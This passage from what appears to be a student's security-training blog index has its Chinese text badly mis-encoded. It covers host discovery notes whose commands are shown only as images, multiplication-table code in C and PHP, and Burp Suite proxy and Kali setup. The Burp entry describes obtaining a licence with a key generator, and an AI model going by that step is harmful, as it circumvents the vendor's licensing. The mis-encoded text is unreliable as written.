src="https://img-blog.csdnimg.cn/20201120004448609.png#pic_center"></p><h2 id="ä¸»åŠ¨ä¿¡æ¯æ”¶é›†"><a href="#ä¸»åŠ¨ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸»åŠ¨ä¿¡æ¯æ”¶é›†"></a>ä¸»åŠ¨ä¿¡æ¯æ”¶é›†</h2><p>â‘ ç›´æ¥ä¸ç›®æ ‡å‘ç”Ÿæ¥è§¦ï¼ˆè¢«å‘ç°çš„é£é™©æå¤§ï¼‰<br>â‘¡äºŒå±‚å‘ç° ä¼˜ï¼šæ‰«æå¿«ã€å¯é      ç¼ºï¼šä¸å¯è·¯ç”±(åªèƒ½å‘ç°æœ¬ç½‘æ®µçš„ä¸»æœº)<br>åˆ©ç”¨çš„æ˜¯APRåè®®ï¼ŒæŠ“åŒ…<br>å‘½ä»¤æœ‰ï¼š<img src="https://img-blog.csdnimg.cn/20201120004858371.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201120004732355.png#pic_center"></p><p><img src="https://img-blog.csdnimg.cn/20201120004205393.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201120004546683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><p>â‘¢ä¸‰å±‚å‘ç°<br><img src="https://img-blog.csdnimg.cn/20201120004928587.png#pic_center"><img src="https://img-blog.csdnimg.cn/20201120004938513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center">â‘£å››å±‚å‘ç°<br><img src="https://img-blog.csdnimg.cn/20201120005033130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><img src="https://img-blog.csdnimg.cn/20201120005051567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center">ä»»åŠ¡ï¼šä¹ä¹ä¹˜æ³•è¡¨<br>Cè¯­è¨€</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">9</span>; i++) <br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= i; j++) <br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%dx%d=%d &quot;</span>, j, i, i * j);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>php</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ä¹ä¹ä¹˜æ³•è¡¨<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="css"><span class="xml"><span class="hljs-selector-tag">table</span>&#123;</span></span><br><span class="css"><span class="xml">    <span class="hljs-attribute">border-collapse</span>:collapse; <span class="hljs-attribute">border-spacing</span>:<span class="hljs-number">0</span>; <span class="hljs-attribute">border-left</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; <span class="hljs-attribute">border-top</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; </span></span><br><span class="css"><span class="xml">&#125;</span></span><br><span class="css"><span class="xml"><span class="hljs-selector-tag">td</span>&#123;</span></span><br><span class="css"><span class="xml">    <span class="hljs-attribute">border-right</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; <span class="hljs-attribute">border-bottom</span>:<span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>; <span class="hljs-attribute">padding</span>:<span class="hljs-number">3px</span> <span class="hljs-number">15px</span>; <span class="hljs-attribute">text-align</span><span class="hljs-selector-pseudo">:left</span>; <span class="hljs-attribute">color</span>:<span class="hljs-number">#3C3C3C</span>;</span></span><br><span class="css"><span class="xml">&#125;</span></span><br><span class="css"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&#x27;600&#x27;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&#x27;1&#x27;</span>&gt;</span></span><br><span class="xml"></span><span class="php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="php"><span class="hljs-comment">//æ§åˆ¶è¡Œæ•°</span></span><br><span class="php"> <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$j</span>&lt;=<span class="hljs-number">9</span>;<span class="hljs-variable">$j</span>++)&#123;</span><br><span class="php">     <span class="hljs-comment">//trå¼€å§‹</span></span><br><span class="php">     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="php">     <span class="hljs-comment">//æ§åˆ¶åˆ—æ•°</span></span><br><span class="php">     <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-variable">$j</span>;<span class="hljs-variable">$i</span>++)&#123;</span><br><span class="php">         <span class="hljs-comment">//è¾“å‡ºtd</span></span><br><span class="php">         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;<span class="hljs-subst">&#123;$i&#125;</span>x<span class="hljs-subst">&#123;$j&#125;</span>=&quot;</span>.(<span class="hljs-variable">$i</span>*<span class="hljs-variable">$j</span>).<span class="hljs-string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="php">    &#125;</span><br><span class="php">    <span class="hljs-comment">//trç»“æŸ</span></span><br><span class="php">     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="php">&#125;</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>â€‹    </p><p>â€‹    </p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>burp</title>
    <link href="/2020/11/19/burp/"/>
    <url>/2020/11/19/burp/</url>
    
    <content type="html"><![CDATA[<p>721ç¬¬ä¸€æ¬¡åŸ¹è®­å°±ç½‘ç»œå®‰å…¨å¯¹å…¶è¿›è¡Œä¸€äº›ä»‹ç»å’Œæ–¹å‘ä¸Šçš„è®²è§£ï¼Œè¿˜æœ‰ä¸€äº›ç½‘ç»œé’“é±¼ï¼Œå­—å…¸çˆ†ç ´ç­‰æ”»å‡»æ‰‹æ®µï¼Œå¹¶æ¼”ç¤ºäº†burpå®ç°å¯¹HTTPçš„æŠ“åŒ…ï¼Œåˆ†ææŠ“åŒ…çš„å†…å®¹ï¼Œä»¥åŠåˆ†äº«äº†åˆ©ç”¨burpå¯ä»¥å®ç°ä»€ä¹ˆã€‚</p><p>æ­¤æ¬¡ä»»åŠ¡æœ‰ï¼šç†Ÿæ‚‰HTTPåè®®ï¼Œåˆ©ç”¨burpæŠ“åŒ…ï¼Œæ­å»ºè™šæ‹Ÿæœºkaliã€‚</p><h1 id="é‡ç‚¹å†…å®¹ï¼šburp"><a href="#é‡ç‚¹å†…å®¹ï¼šburp" class="headerlink" title="é‡ç‚¹å†…å®¹ï¼šburp"></a>é‡ç‚¹å†…å®¹ï¼šburp</h1><h2 id="1-1burpçš„å®‰è£…"><a href="#1-1burpçš„å®‰è£…" class="headerlink" title="1.1burpçš„å®‰è£…"></a>1.1burpçš„å®‰è£…</h2><p>â‘ <strong>é…ç½®Javaç¯å¢ƒ</strong><br>(é—®ï¼šä¸ºä»€ä¹ˆè¦è¿™æ ·é…ç½®     ç­”ï¼šburpæ˜¯ç”±Javaè¯­è¨€ç¼–å†™è€Œæˆï¼Œå…¶å¯æ‰§è¡Œç¨‹åºæ˜¯javaæ–‡ä»¶ç±»å‹çš„jaræ–‡ä»¶ï¼Œè¿è¡Œæ—¶ä¾èµ–äºJRE)<br>â‘¡<strong>é…ç½®ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡</strong>ï¼ˆç¯å¢ƒå˜é‡ï¼Œå°±æ˜¯åœ¨æ“ä½œç³»ç»Ÿä¸­ä¸€ä¸ªå…·æœ‰ç‰¹å®šåå­—çš„å¯¹è±¡ï¼Œå®ƒåŒ…å«äº†ä¸€ä¸ªæˆ–è€…å¤šä¸ªåº”ç”¨ç¨‹åºæ‰€å°†ä½¿ç”¨åˆ°çš„ä¿¡æ¯ã€‚ä¾‹å¦‚Windowså’ŒDOSæ“ä½œç³»ç»Ÿä¸­çš„pathç¯å¢ƒå˜é‡ï¼Œå½“è¦æ±‚ç³»ç»Ÿè¿è¡Œä¸€ä¸ªç¨‹åºè€Œæ²¡æœ‰å‘Šè¯‰å®ƒç¨‹åºæ‰€åœ¨çš„å®Œæ•´è·¯å¾„æ—¶ï¼Œç³»ç»Ÿé™¤äº†åœ¨å½“å‰ç›®å½•ä¸‹é¢å¯»æ‰¾æ­¤ç¨‹åºå¤–ï¼Œè¿˜åº”åˆ°pathä¸­æŒ‡å®šçš„è·¯å¾„å»æ‰¾ã€‚ç”¨æˆ·é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œæ¥æ›´å¥½çš„è¿è¡Œè¿›ç¨‹ã€‚ï¼‰<br>â‘¢ç”±äºburpæ˜¯ä»˜è´¹è½¯ä»¶ï¼Œæˆ‘ä»¬éœ€è¦<strong>ä½¿ç”¨æ³¨å†Œæœºæ¥è·å–license</strong>ï¼Œå¦‚å›¾<img src="https://img-blog.csdnimg.cn/20201119214908963.gif#pic_center" alt="burpæ³¨å†Œæœºçš„æ“ä½œ">â‘¢æ³¨å†Œåå³å¯ä½¿ç”¨burp</p><h2 id="1-2æŠ“åŒ…"><a href="#1-2æŠ“åŒ…" class="headerlink" title="1.2æŠ“åŒ…"></a>1.2æŠ“åŒ…</h2><p>â‘ <strong>å¯¹æµè§ˆå™¨è®¾ç½®ä»£ç†</strong>ï¼šå®‰è£…foxyproxyæ’ä»¶ï¼Œè®¾ç½®ä»£ç†IP<br>127.0.0.1 ç«¯å£8080çš„ä»£ç†<br>â‘¡æ‰“å¼€æµè§ˆå™¨ï¼Œæ‰“å¼€ä»£ç†ï¼Œéšä¾¿æ‰“å¼€ä¸€ä¸ªç½‘ç«™ï¼Œåœ¨burpçš„<strong>proxy</strong>å³å¯æŸ¥çœ‹å¯¹ç½‘ç«™HTTPçš„æŠ“åŒ…,å°†æ‰€æŠ“çš„åŒ…å‘è‡³<strong>repeater</strong>ï¼Œå³å¯å¯¹ç½‘ç«™çš„å›åº”è¿›è¡Œæ‹¦æˆªã€‚</p><p><img src="https://img-blog.csdnimg.cn/20201119223920841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center" alt="proxy"><br><img src="https://img-blog.csdnimg.cn/20201119224103488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center" alt="repeater"></p><h2 id="æ­å»ºkali"><a href="#æ­å»ºkali" class="headerlink" title="æ­å»ºkali"></a>æ­å»ºkali</h2><p>2.1å®‰è£…VMware Workstation ï¼ˆç•¥ï¼‰<br>2.2ä¸‹è½½é•œåƒæ–‡ä»¶ï¼ˆç•¥ï¼‰<br>2.3å®‰è£…kaliï¼ˆç•¥ï¼‰</p><h2 id="3-HTTPåè®®â€”â€“çœ‹ä¹¦"><a href="#3-HTTPåè®®â€”â€“çœ‹ä¹¦" class="headerlink" title="3.HTTPåè®®â€”â€“çœ‹ä¹¦"></a>3.HTTPåè®®â€”â€“çœ‹ä¹¦</h2>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
